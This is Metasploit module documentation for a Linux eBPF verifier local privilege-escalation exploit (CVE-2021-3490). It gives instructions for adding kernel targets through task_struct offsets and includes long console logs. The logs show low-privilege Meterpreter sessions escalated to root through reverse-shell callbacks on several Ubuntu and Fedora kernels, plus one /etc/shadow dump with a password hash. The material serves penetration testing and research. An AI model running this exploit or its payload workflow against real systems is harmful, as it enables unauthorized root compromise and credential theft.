## Vulnerable Application

Linux kernels from 5.7-rc1 prior to 5.13-rc4, 5.12.4, 5.11.21, and
5.10.37 are vulnerable to a bug in the eBPF verifier's verification
of ALU32 operations in the `scalar32_min_max_and` function when performing
AND operations, whereby under certain conditions the bounds of a
32 bit register would not be properly updated.

This can be abused by attackers to conduct an out of bounds read
and write in the Linux kernel and therefore achieve arbitrary
code execution as the `root` user.

The target system must be compiled with eBPF support and not have
`kernel.unprivileged_bpf_disabled` set, which prevents unprivileged
users from loading eBPF programs into the kernel. Note that if
`kernel.unprivileged_bpf_disabled` is enabled this module can still be
utilized to bypass protections such as SELinux, however the user
must already be logged into the system as a privileged user such as `root`.

### Vulnerable Targets
Ubuntu 20.04 (Focal Fossa) 5.8.x kernels prior to 5.8.0-53.60
Ubuntu 20.10 (Groovy Gorilla) 5.8.x kernels prior to 5.8.0-53.60
Ubuntu 21.04 (Hirsute Hippo) 5.11.x kernels prior to 5.11.0-17.18
Fedora kernel versions 5.x from 5.7.x up to but not including 5.11.20-300.

#### Adding New Targets
Credits for the following code go to Robert whose code I took from
https://blog.sourcerer.io/writing-a-simple-linux-kernel-module-d9dc3762c234.

Save this in a file named `lkm_example.c`

```
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Robert W. Oliver II");
MODULE_DESCRIPTION("A simple example Linux module.");
MODULE_VERSION("0.01");
static int __init lkm_example_init(void) {
 printk(KERN_INFO "cred offset: %lu\n", offsetof(struct task_struct, cred));
 return 0;
}
static void __exit lkm_example_exit(void) {
 printk(KERN_INFO "pid_links offset: %lu\n", offsetof(struct task_struct, pid_links));
}
module_init(lkm_example_init);
module_exit(lkm_example_exit);
```

In the same folder make a file named `Makefile` and paste this code into it:

```
obj-m += lkm_example.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Then run the following:

```
sudo apt-get install build-essential linux-headers-`uname -r`
make && sudo insmod lkm_example.ko && sudo rmmod lkm_example && sudo dmesg
```

Then find the output from the last two lines. It should look something like this:

```
[40219.507922] cred offset: 2776
[40219.519139] pid_links offset: 2440
```

Update `external/source/exploits/CVE-2021-3490/Linux_LPE_eBPF_CVE-2021-3490/Makefile` and add in a new line
like so, replacing `FEDORA_KERNEL_5_10` with whatever name you prefer.

```
FEDORA_KERNEL_5_10:
	$(CC) -DFEDORA_KERNEL_5_10 $(CMP)
```

Update `external/source/exploits/CVE-2021-3490/Linux_LPE_eBPF_CVE-2021-3490/include/kernel_defs.h` and include
the following two lines, replacing `FEDORA_KERNEL_5_10` with the name you used in the step above.

```
#ifdef FEDORA_KERNEL_5_10
#define TASK_LIST_OFFSET 0x948
#endif
....
#ifdef FEDORA_KERNEL_5_10
#define TASK_CRED_OFFSET 0xAD0
#endif
```

The first number above should correspond to the number returned after `pid_links offset`, and the second number should
be the number after the text `cred offset:`.

Additionally if you are adding a kernel prior to 5.11.x to the targets, update the following line
and add `|| defined(<the name you used in earlier steps>)` to the end of it.

```
#if defined(GROOVY) || defined(FEDORA_KERNEL_5_7) || defined(FEDORA_KERNEL_5_8) || defined(FEDORA_KERNEL_5_9) || defined(FEDORA_KERNEL_5_10)
    uint64_t kref; /* From Linux kernel 5.11 this field was removed, however it is present in all previous versions.
                    See https://elixir.bootlin.com/linux/v5.11-rc1/source/include/linux/pid_namespace.h and
                    https://elixir.bootlin.com/linux/v5.10.60/source/include/linux/pid_namespace.h for a comparison */
```

Run `make`. If all goes well you should get a new binary at `bin/exploit.bin`. Move
this to `data/exploits/cve-2021-3490/<target name and kernel version here>.bin`.

Finally open up `modules/exploits/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe.rb` so that
it calls `upload_and_chmodx` for the new binary in the right situations.

## Verification Steps

  1. Start `msfconsole`
  2. Gain a Linux Meterpreter shell on a target vulnerable system.
  3. Do: `use exploit/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe`
  4. Do: `set session #` where the session number corresponds to the low privileged Meterpreter session you spawned earlier.
  5. Do: `set LHOST <ip of your host>`
  6. Do: `set LPORT <port to connect back on>`
  7. Do: `exploit`


## Options

### WritableDir
A folder we can write files to.  Defaults to `/tmp`

### CmdTimeout
The maximum number of seconds to wait for the exploit to run before we end up timing out. Increase this value if the exploit is timing out.

## Scenarios

### Ubuntu 21.04 (with Linux 5.11.0-16-generic)

```
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/bind_tcp
payload => linux/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x64/meterpreter/bind_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST                   no        The target address


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set RHOST 192.168.224.221
RHOST => 192.168.224.221
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 192.168.224.221:4444
[*] Sending stage (3012548 bytes) to 192.168.224.221
[*] Meterpreter session 1 opened (192.168.224.128:41855 -> 192.168.224.221:4444) at 2021-08-17 17:37:31 -0500

meterpreter > sysinfo
Computer     : 192.168.224.221
OS           : Ubuntu 21.04 (Linux 5.11.0-16-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > shell
Process 4636 created.
Channel 1 created.
cat /etc/shadow
cat: /etc/shadow: Permission denied
exit
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                    Connection
  --  ----  ----                   -----------                                    ----------
  1         meterpreter x64/linux  test @ ubuntu (uid=1000, gid=1000, euid=1000,  192.168.224.128:41855 -> 192.168.224.221:4444
                                    egid=1000) @ 192.168.224.221                  (192.168.224.221)

msf6 exploit(multi/handler) > use exploit/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > show options

Module options (exploit/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   CmdTimeout  120              yes       Maximum number of seconds to wait for the exploit to complete
   SESSION                      yes       The session to run this module on.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.224.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Auto


msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > set SESSION 1
SESSION => 1
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > exploit

[*] Started reverse TCP handler on 192.168.224.128:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Writing '/tmp/.802fke5' (39352 bytes) ...
[*] Writing '/tmp/.75mogl0Vz6' (250 bytes) ...
[*] Launching exploit ...
[!] Note that things may appear to hang due to the exploit not exiting.
[!] Feel free to press CTRL+C if the shell is returned before 200 seconds are up.
[*] Sending stage (3012548 bytes) to 192.168.224.221
[+] Exploit completed successfully, shell should be returning soon!
[+] Deleted /tmp/.802fke5
[+] Deleted /tmp/.75mogl0Vz6
[*] Meterpreter session 2 opened (192.168.224.128:4444 -> 192.168.224.221:42170) at 2021-08-17 17:40:19 -0500

meterpreter > sysinfo
Computer     : 192.168.224.221
OS           : Ubuntu 21.04 (Linux 5.11.0-16-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: root @ ubuntu (uid=0, gid=0, euid=0, egid=0)
meterpreter > background
[*] Backgrounding session 2...
smsf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                    Connection
  --  ----  ----                   -----------                                    ----------
  1         meterpreter x64/linux  test @ ubuntu (uid=1000, gid=1000, euid=1000,  192.168.224.128:41855 -> 192.168.224.221:4444
                                    egid=1000) @ 192.168.224.221                  (192.168.224.221)
  2         meterpreter x64/linux  root @ ubuntu (uid=0, gid=0, euid=0, egid=0)   192.168.224.128:4444 -> 192.168.224.221:42170
                                   @ 192.168.224.221                              (192.168.224.221)

msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) >
```


### Ubuntu 20.10 (with Linux 5.8.0-25-generic)

```
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/bind_tcp
payload => linux/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x64/meterpreter/bind_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST                   no        The target address


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set RHOST 192.168.224.220
RHOST => 192.168.224.220
msf6 exploit(multi/handler) > exploit

[*] Started bind TCP handler against 192.168.224.220:4444
[*] Sending stage (3012548 bytes) to 192.168.224.220
[*] Meterpreter session 1 opened (192.168.224.128:46051 -> 192.168.224.220:4444) at 2021-08-17 17:51:38 -0500

meterpreter > sysinfo
Computer     : 192.168.224.220
OS           : Ubuntu 20.10 (Linux 5.8.0-25-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: test @ ubuntu (uid=1000, gid=1000, euid=1000, egid=1000)
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use exploit/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > show options

Module options (exploit/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   CmdTimeout  120              yes       Maximum number of seconds to wait for the exploit to complete
   SESSION                      yes       The session to run this module on.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.224.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Auto


msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > set SESSION 1
SESSION => 1
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > check
[*] The target appears to be vulnerable.
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > exploit

[*] Started reverse TCP handler on 192.168.224.128:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Writing '/tmp/.T0AUoK' (39400 bytes) ...
[*] Writing '/tmp/.R3N8FO' (250 bytes) ...
[*] Launching exploit...
[!] Note that things may appear to hang due to the exploit not exiting.
[!] Feel free to press CTRL+C if the shell is returned before 9000 seconds are up.
[*] Sending stage (3012548 bytes) to 192.168.224.220
[+] Exploit completed successfully, shell should be returning soon!
[+] Deleted /tmp/.T0AUoK
[+] Deleted /tmp/.R3N8FO
[*] Meterpreter session 2 opened (192.168.224.128:4444 -> 192.168.224.220:47914) at 2021-08-31 14:58:43 -0500

meterpreter >

meterpreter > sysinfo
Computer     : 192.168.224.220
OS           : Ubuntu 20.10 (Linux 5.8.0-25-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: root @ ubuntu (uid=0, gid=0, euid=0, egid=0)
meterpreter > background
[*] Backgrounding session 2...
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                    Connection
  --  ----  ----                   -----------                                    ----------
  1         meterpreter x64/linux  test @ ubuntu (uid=1000, gid=1000, euid=1000,  192.168.224.128:46051 -> 192.168.224.220:4444
                                    egid=1000) @ 192.168.224.220                  (192.168.224.220)
  2         meterpreter x64/linux  root @ ubuntu (uid=0, gid=0, euid=0, egid=0)   192.168.224.128:4444 -> 192.168.224.220:47878
                                   @ 192.168.224.220                              (192.168.224.220)

msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) >
```

### Ubuntu 20.04.02 LTS (with Linux 5.8.0-43-generic)
```
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/bind_tcp
payload => linux/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x64/meterpreter/bind_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST                   no        The target address


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set RHOST 192.168.224.222
RHOST => 192.168.224.222
msf6 exploit(multi/handler) > exploit

[*] Started bind TCP handler against 192.168.224.222:4444
[*] Sending stage (3012548 bytes) to 192.168.224.222
[*] Meterpreter session 1 opened (192.168.224.128:44433 -> 192.168.224.222:4444) at 2021-08-19 14:15:49 -0500

meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > previous
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > show options

Module options (exploit/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   CmdTimeout  120              yes       Maximum number of seconds to wait for the exploit to complete
   SESSION                      yes       The session to run this module on.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.224.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Auto


msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > set SESSION 1
SESSION => 1
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > check
[*] The target appears to be vulnerable.
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > exploit

[*] Started reverse TCP handler on 192.168.224.128:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Writing '/tmp/.RyfMnlY' (39352 bytes) ...
[*] Writing '/tmp/.7JmBQ1nu58' (250 bytes) ...
[*] Launching exploit ...
[!] Note that things may appear to hang due to the exploit not exiting.
[!] Feel free to press CTRL+C if the shell is returned before 200 seconds are up.
[*] Sending stage (3012548 bytes) to 192.168.224.222
[+] Exploit completed successfully, shell should be returning soon!
[+] Deleted /tmp/.RyfMnlY
[+] Deleted /tmp/.7JmBQ1nu58
[*] Meterpreter session 2 opened (192.168.224.128:4444 -> 192.168.224.222:48204) at 2021-08-19 14:17:12 -0500

meterpreter > sysinfo
Computer     : 192.168.224.222
OS           : Ubuntu 20.04 (Linux 5.8.0-43-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: root @ ubuntu (uid=0, gid=0, euid=0, egid=0)
meterpreter > background
[*] Backgrounding session 2...
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                    Connection
  --  ----  ----                   -----------                                    ----------
  1         meterpreter x64/linux  test @ ubuntu (uid=1000, gid=1000, euid=1000,  192.168.224.128:44433 -> 192.168.224.222:4444
                                    egid=1000) @ 192.168.224.222                  (192.168.224.222)
  2         meterpreter x64/linux  root @ ubuntu (uid=0, gid=0, euid=0, egid=0)   192.168.224.128:4444 -> 192.168.224.222:48204
                                   @ 192.168.224.222                              (192.168.224.222)

msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) >
```

### Fedora 32 with Linux Kernel 5.7.11-200
```
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/bind_tcp
payload => linux/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x64/meterpreter/bind_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST                   no        The target address


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set RHOST 192.168.224.223
RHOST => 192.168.224.223
msf6 exploit(multi/handler) > exploit

[*] Started bind TCP handler against 192.168.224.223:4444
[*] Sending stage (3012548 bytes) to 192.168.224.223
[*] Meterpreter session 1 opened (192.168.224.128:41579 -> 192.168.224.223:4444) at 2021-08-20 13:29:30 -0500

meterpreter > sysinfo
Computer     : localhost.localdomain
OS           : Fedora 32 (Linux 5.7.11-200.fc32.x86_64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: test @ localhost.localdomain (uid=1000, gid=1000, euid=1000, egid=1000)
meterpreter > shell
Process 2100 created.
Channel 1 created.
cat /etc/shadow
cat: /etc/shadow: Permission denied
^Z
Background channel 1? [y/N]  y
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use exploit/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > show options

Module options (exploit/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   CmdTimeout  120              yes       Maximum number of seconds to wait for the exploit to complete
   SESSION                      yes       The session to run this module on.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.224.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Auto


msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > set SESSION 1
SESSION => 1
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > check
[*] The target appears to be vulnerable.
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > exploit

[*] Started reverse TCP handler on 192.168.224.128:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Writing '/tmp/.VBiCx' (39352 bytes) ...
[*] Writing '/tmp/.KqjrGX5' (250 bytes) ...
[*] Launching exploit ...
[!] Note that things may appear to hang due to the exploit not exiting.
[!] Feel free to press CTRL+C if the shell is returned before 200 seconds are up.
[*] Sending stage (3012548 bytes) to 192.168.224.223
[+] Exploit completed successfully, shell should be returning soon!
[+] Deleted /tmp/.VBiCx
[+] Deleted /tmp/.KqjrGX5
[*] Meterpreter session 2 opened (192.168.224.128:4444 -> 192.168.224.223:54884) at 2021-08-20 13:33:38 -0500
^C[-] Exploit failed [user-interrupt]: Interrupt
[-] exploit: Interrupted
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                    Connection
  --  ----  ----                   -----------                                    ----------
  1         meterpreter x64/linux  test @ localhost.localdomain (uid=1000, gid=1  192.168.224.128:41579 -> 192.168.224.223:4444
                                   000, euid=1000, egid=1000) @ loc...            (192.168.224.223)
  2         meterpreter x64/linux  root @ localhost.localdomain (uid=0, gid=0, e  192.168.224.128:4444 -> 192.168.224.223:54884
                                   uid=0, egid=0) @ localhost.local...            (192.168.224.223)

msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: root @ localhost.localdomain (uid=0, gid=0, euid=0, egid=0)
meterpreter > shell
Process 2148 created.
Channel 1 created.
cat /etc/shadow
root:!::0:99999:7:::
bin:*:18292:0:99999:7:::
daemon:*:18292:0:99999:7:::
adm:*:18292:0:99999:7:::
lp:*:18292:0:99999:7:::
sync:*:18292:0:99999:7:::
shutdown:*:18292:0:99999:7:::
halt:*:18292:0:99999:7:::
mail:*:18292:0:99999:7:::
operator:*:18292:0:99999:7:::
games:*:18292:0:99999:7:::
ftp:*:18292:0:99999:7:::
nobody:*:18292:0:99999:7:::
systemd-coredump:!!:18374::::::
systemd-network:!!:18374::::::
systemd-resolve:!!:18374::::::
dbus:!!:18374::::::
tss:!!:18374::::::
qemu:!!:18374::::::
gluster:!!:18374::::::
polkitd:!!:18374::::::
rtkit:!!:18374::::::
pulse:!!:18374::::::
systemd-timesync:!!:18374::::::
avahi:!!:18374::::::
pipewire:!!:18374::::::
chrony:!!:18374::::::
unbound:!!:18374::::::
usbmuxd:!!:18374::::::
dnsmasq:!!:18374::::::
geoclue:!!:18374::::::
saslauth:!!:18374::::::
radvd:!!:18374::::::
rpc:!!:18374:0:99999:7:::
apache:!!:18374::::::
colord:!!:18374::::::
rpcuser:!!:18374::::::
openvpn:!!:18374::::::
nm-openvpn:!!:18374::::::
abrt:!!:18374::::::
nm-openconnect:!!:18374::::::
flatpak:!!:18374::::::
gdm:!!:18374::::::
gnome-initial-setup:!!:18374::::::
sshd:!!:18374::::::
vboxadd:!!:18374::::::
tcpdump:!!:18374::::::
test:$6$qUS1ahlM0hqfNoyO$TZO8sUu1btvp4XRhqjy4Cetjm1LZ3DOWZDqfx8OPfB4QXjmiK5EPQmBW.TT0CJpSQBsanT0u9xokn1NtGepas/:18859:0:99999:7:::
```

### Fedora 32 with Linux Kernel 5.8.8-200
```
msf6 > use multi/handler
s[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/bind_tcp
payload => linux/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 192.168.224.223
RHOST => 192.168.224.223
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 192.168.224.223:4444
[*] Sending stage (3012548 bytes) to 192.168.224.223
[*] Meterpreter session 1 opened (192.168.224.128:35689 -> 192.168.224.223:4444) at 2021-08-20 14:45:57 -0500

meterpreter > getuid
Server username: test @ localhost.localdomain (uid=1000, gid=1000, euid=1000, egid=1000)
meterpreter > background
[*] Backgrounding session 1...
smsf6 exploit(multi/handler) >use exploit/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > set SESSION 1
SESSION => 1
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > show options

Module options (exploit/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe):

   Name        Current Setting   Required  Description
   ----        ---------------   --------  -----------
   CmdTimeout  120               yes       Maximum number of seconds to wait for the exploit to complete
   SESSION     1                 yes       The session to run this module on.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.224.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Auto


msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > check
[*] The target appears to be vulnerable.
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > exploit

[*] Started reverse TCP handler on 192.168.224.128:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Writing '/tmp/.6y6Ws' (39352 bytes) ...
[*] Writing '/tmp/.SYYFfC' (250 bytes) ...
[*] Launching exploit ...
[!] Note that things may appear to hang due to the exploit not exiting.
[!] Feel free to press CTRL+C if the shell is returned before 200 seconds are up.
[*] Sending stage (3012548 bytes) to 192.168.224.223
[+] Exploit completed successfully, shell should be returning soon!
[+] Deleted /tmp/.6y6Ws
[+] Deleted /tmp/.SYYFfC
[*] Meterpreter session 2 opened (192.168.224.128:4444 -> 192.168.224.223:37368) at 2021-08-20 14:47:44 -0500
^C[-] Exploit failed [user-interrupt]: Interrupt
[-] exploit: Interrupted
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                    Connection
  --  ----  ----                   -----------                                    ----------
  1         meterpreter x64/linux  test @ localhost.localdomain (uid=1000, gid=1  192.168.224.128:35689 -> 192.168.224.223:4444
                                   000, euid=1000, egid=1000) @ loc...            (192.168.224.223)
  2         meterpreter x64/linux  root @ localhost.localdomain (uid=0, gid=0, e  192.168.224.128:4444 -> 192.168.224.223:37368
                                   uid=0, egid=0) @ localhost.local...            (192.168.224.223)

msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > shell
Process 3170 created.
Channel 1 created.
id
uid=0(root) gid=0(root) groups=0(root),10(wheel),1000(test) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
uname -a
Linux localhost.localdomain 5.8.8-200.fc32.x86_64 #1 SMP Wed Sep 9 19:31:09 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

### Fedora 32 Linux Kernel 5.9.8-100

```
msf6 exploit(multi/handler) > use exploit/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > set session 1
session => 1
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > show options

Module options (exploit/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe):

   Name        Current Setting   Required  Description
   ----        ---------------   --------  -----------
   CmdTimeout  120               yes       Maximum number of seconds to wait for the exploit to complete
   SESSION     1                 yes       The session to run this module on.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.224.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Auto


msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > check
[*] The target appears to be vulnerable.
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > set VERBOSE true
VERBOSE => true
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > exploit

[*] Started reverse TCP handler on 192.168.224.128:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Unprivileged BPF loading is permitted
[+] Kernel version 5.9.8-100.fc32.x86_64 appears to be vulnerable
[+] Kernel config has CONFIG_BPF_SYSCALL enabled
[+] The target appears to be vulnerable.
[*] Dropping pre-compiled exploit on system...
[*] Writing '/tmp/.RRaKt' (39352 bytes) ...
[*] Writing '/tmp/.yYaQKj' (250 bytes) ...
[*] Launching exploit ...
[!] Note that things may appear to hang due to the exploit not exiting.
[!] Feel free to press CTRL+C if the shell is returned before 200 seconds are up.
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3012548 bytes) to 192.168.224.223
[+] Exploit completed successfully, shell should be returning soon!
[+] Deleted /tmp/.RRaKt
[+] Deleted /tmp/.yYaQKj
[*] Meterpreter session 2 opened (192.168.224.128:4444 -> 192.168.224.223:60752) at 2021-08-20 16:34:42 -0500

meterpreter > getuid
Server username: root @ localhost.localdomain (uid=0, gid=0, euid=0, egid=0)
meterpreter > sysinfo
Computer     : localhost.localdomain
OS           : Fedora 32 (Linux 5.9.8-100.fc32.x86_64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > background
[*] Backgrounding session 2...
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                    Connection
  --  ----  ----                   -----------                                    ----------
  1         meterpreter x64/linux  test @ localhost.localdomain (uid=1000, gid=1  192.168.224.128:37027 -> 192.168.224.223:4444
                                   000, euid=1000, egid=1000) @ loc...            (192.168.224.223)
  2         meterpreter x64/linux  root @ localhost.localdomain (uid=0, gid=0, e  192.168.224.128:4444 -> 192.168.224.223:60752
                                   uid=0, egid=0) @ localhost.local...            (192.168.224.223)

msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) >
```

### Fedora 32 Linux Kernel 5.10.12-100
```
msf6 exploit(multi/handler) > exploit

[*] Started bind TCP handler against 192.168.224.223:4444
[*] Sending stage (3012548 bytes) to 192.168.224.223
[*] Meterpreter session 1 opened (192.168.224.128:45349 -> 192.168.224.223:4444) at 2021-08-20 17:59:50 -0500

meterpreter > sysinfo
Computer     : localhost.localdomain
OS           : Fedora 32 (Linux 5.10.12-100.fc32.x86_64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > background
[*] Backgrounding session 1...
